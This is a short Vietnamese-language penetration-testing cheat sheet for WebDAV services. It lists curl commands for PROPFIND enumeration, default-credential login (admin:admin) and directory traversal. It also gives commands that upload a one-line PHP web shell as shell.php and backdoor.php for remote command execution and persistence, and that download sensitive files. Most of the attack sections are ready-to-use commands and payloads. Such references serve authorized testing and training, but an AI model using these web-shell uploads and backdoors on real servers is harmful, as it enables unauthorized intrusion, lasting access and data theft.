## WebDAV (Port 80, 443)

## Connect

### WebDAV Client

Sử dụng client như Windows Explorer, macOS Finder, Cyberduck, hoặc WinSCP để kết nối tới máy chủ WebDAV với URL và thông tin đăng nhập:

### curl

Sử dụng cURL hoặc cadaver để kết nối và tương tác với máy chủ WebDAV:

```
curl -u <username>:<password> -X PROPFIND http://<ip>/webdav/
```

***

## Enumeration

### Liệt kê tệp và thư mục

Sử dụng phương thức PROPFIND để liệt kê tệp và thư mục trên máy chủ WebDAV:

```
curl -u <username>:<password> -X PROPFIND http://<ip>/webdav/
```

***

## Attack Vectors

### Đăng nhập với thông tin mặc định

Khai thác cấu hình sai hoặc thông tin đăng nhập yếu để truy cập trái phép:

```
curl -u admin:admin -X PROPFIND http://<ip>/webdav/
```

### Thao tác tệp cho RCE

Tải lên tệp độc hại (như script PHP hoặc ASP) để thực thi mã từ xa trên máy chủ:

{% code overflow="wrap" %}

```
curl -u <username>:<password> -X PUT -d "<?php system(\$_GET['cmd']); ?>" http://<ip>/webdav/shell.php
```

{% endcode %}

Thực thi lệnh qua URL: http\:///webdav/shell.php?cmd=

***

## Post-Exploitation

### Khai thác cấu hình sai

Khai thác các cấu hình sai như quyền truy cập thư mục hoặc vượt thư mục để leo thang đặc quyền:

```
curl -u <username>:<password> -X PROPFIND http://<ip>/webdav/../
```

### Trích xuất dữ liệu

Tải xuống tệp nhạy cảm từ máy chủ WebDAV để trích xuất dữ liệu:

```
curl -u <username>:<password> http://<ip>/webdav/<file> -o <local_file>
```

### Duy trì truy cập

Tải lên backdoor hoặc sửa đổi cấu hình để duy trì truy cập lâu dài:

{% code overflow="wrap" %}

```
curl -u <username>:<password> -X PUT -d "<?php system(\$_GET['cmd']); ?>" http://<ip>/webdav/backdoor.php
```

{% endcode %}